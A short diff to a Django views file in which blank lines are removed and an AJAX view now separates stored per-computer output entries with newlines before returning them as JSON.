@@ -6,8 +6,6 @@ from datetime import timedelta
 from django.utils import timezone
 from django.views.decorators.csrf import csrf_exempt
 
-
-
 def home(request):
     if request.user.is_superuser:
         context = {
@@ -26,7 +24,7 @@ def ajax(request, pk):
     data = ""
     computer = Computer.objects.all().filter(id=pk)[0]
     for output in Output.objects.all().filter(target=computer):
-        data += output.output
+        data += "\n" + output.output
     return JsonResponse({'data':data})
 
 def check_pc_online(request, pk):
